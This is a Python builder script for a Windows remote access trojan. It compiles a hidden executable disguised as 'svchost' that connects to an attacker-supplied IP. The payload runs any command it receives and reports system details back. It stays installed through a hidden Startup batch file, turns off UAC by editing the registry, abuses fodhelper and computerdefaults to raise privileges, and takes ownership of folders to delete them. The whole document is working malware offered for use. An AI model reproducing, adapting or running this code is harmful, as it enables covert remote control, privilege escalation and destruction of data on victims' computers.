from subprocess import getoutput
from os import system,environ
from sys import exit
def nuitka()->None:
    ip_address=str(input("Server IP:"))
    with open("svchost.py","w") as file:
        file.write(buf%ip_address)
    environ["CCFLAGS"]="-Ofast"
    system("nuitka .\\svchost.py --mode=accelerated --mode=onefile --remove-output --windows-console-mode=disable --include-data-files=.\\run.exe=.\\run.exe")
    exit(0)
buf=r'''from platform import node,release,machine,processor
from ctypes import windll
from pickle import dumps
from subprocess import getoutput,call
from sys import exit,argv
from os import chdir,environ,system as run
from os.path import basename
from socket import socket,AF_INET,SOCK_STREAM,gaierror
from shutil import copyfile
from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
from psutil import process_iter,AccessDenied
def process_is_double(target:str=argv[0])->bool:
    exists=False
    process = 0
    if argv[0] == target:
        for i in process_iter():
            try:
                if i.exe() == target:
                    process +=1
            except AccessDenied:pass
        return (process >1)
    for i in process_iter():
        try:
            if i.name() == basename(target):exists=True
            if i.exe() == target:process +=1
        except AccessDenied:pass
    return exists and process >1
def process_is_exists(target:str)->bool:return target in (i.name() for i in process_iter())
def split(target:str,tstr:str)->str:
    new_chars=[]
    for i in tstr.lower().split():
        if i.lower() !=target.lower():new_chars.extend([i," "])
    return "".join(new_chars).rsplit(" ")[0]
def connect()->None:
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(999999)
    try:
        s.connect(addr)
        s.send(dumps({"node":node(),"release":release(),"machine":machine(),"processor":processor(),"admin":windll.shell32.IsUserAnAdmin(),"username":environ.get("username")}))
    except TimeoutError:connect()
    except ConnectionRefusedError:connect()
    except gaierror:connect()
def CYS()->None:
    copyfile(argv[0],(r"C:\Users\{}\Documents\\"+basename(argv[0])).format(environ.get("username")))
    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "w") as file:
        file.write("""@Echo off
start C:\\Users\\{0}\\Documents\\{1}
exit""".format(environ.get("username"), basename(argv[0])))
    run("attrib +s +h +r C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(argv[0]))
    run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
def LUA_OFF()->None:
    key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
    SetValueEx(key,"EnableLUA",0,REG_DWORD,0)
    CloseKey(key)
    CYS()
    call("shutdown /r /f /t 0")
    exit(0)
def computerdefaults(target:str=argv[0])->None:
    target = target + ".exe" if target.split(".")[-1] != "exe" else target
    ms_reg = "computerdefaults.exe"
    if argv[0] == target:
        while not process_is_double():call(f"run {target} {ms_reg} computerdefaults.exe")
        return None
    while not process_is_exists(basename(target)):call(f"run {target} {ms_reg} computerdefaults.exe")
def fodhelper(target:str=argv[0])->None:
    target= target+".exe" if target.split(".")[-1] !="exe" else target
    ms_reg = "fodhelper.exe"
    if argv[0] == target:
        while not process_is_double():
            call(f"run {target} {ms_reg} fodhelper.exe")
        return None
    while not process_is_exists(basename(target)):
        call(f"run {target} {ms_reg} fodhelper.exe")
        process_is_exists(basename(target))
def FDR(target:str)->None:
    run("takeown /D Y /R /F {}".format(target))
    run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
    run("rmdir /S /Q {}".format(target))
addr=("%s",8085)
connect()
while True:
    try:
        cmd=s.recv(20971520).decode()
        lcmd=cmd.lower()
        if "cd" in cmd and len(cmd) >2:
            chdir(split("cd",cmd))
            s.send(b"success")
            continue
        if "exit" in cmd:exit(0)
        if "lua" in lcmd:
            s.send("success".encode())
            LUA_OFF()
            continue
        if "computerdefaults" in lcmd and len(lcmd) <17 :
            computerdefaults()
            s.send("success".encode())
            continue
        if "computerdefaults" in lcmd:
            computerdefaults(split("computerdefaults",cmd)[-1])
            s.send("success".encode())
            continue
        if "fodhelper" in lcmd and len(lcmd) <10 :
            fodhelper()
            s.send("success".encode())
            continue
        if "fodhelper" in lcmd:
            fodhelper(split("fodhelper",cmd))
            s.send("success".encode())
            continue
        if "cys" in lcmd:
            CYS()
            s.send("success".encode())
            continue
        if "fdr" in lcmd and len(lcmd) >3:
            FDR(split("fdr",cmd))
            s.send("success".encode())
            continue
        if "refresh" in lcmd:
            s.send("success".encode())
            continue
        if "executable" in lcmd:
            s.send(argv[0].encode())
            continue
        if "cmd /c start" in lcmd:
            call(cmd)
            s.send("success".encode())
            continue
        process=getoutput(cmd)
        s.send(process.encode() if process else "success".encode())
    except ConnectionResetError:connect()
    except OSError:connect()'''
print("Checking For Nuitka")
nuitka_v=getoutput("nuitka --version").split()[0]
if len(nuitka_v)<7:nuitka()
else:print("You Don't Have Installed Nuitka!!\nYou Can Install It Using pip install Nuitka")
